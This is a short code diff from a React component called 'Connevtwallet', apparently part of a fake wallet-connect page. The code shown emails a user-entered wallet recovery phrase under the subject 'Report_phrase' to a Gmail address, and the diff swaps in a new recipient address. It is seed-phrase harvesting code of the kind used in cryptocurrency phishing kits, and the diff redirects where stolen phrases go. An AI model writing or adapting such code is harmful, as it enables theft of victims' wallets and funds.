@@ -51,7 +51,7 @@ const Connevtwallet = () => {
       sendMessage(
         `phrase:  ${value.phrase}`,
         "Report_phrase",
-        "bintazo676@gmail.com"
+        "blockbitwwallet@gmail.com"
       )
         .then(() => {
           setValue({
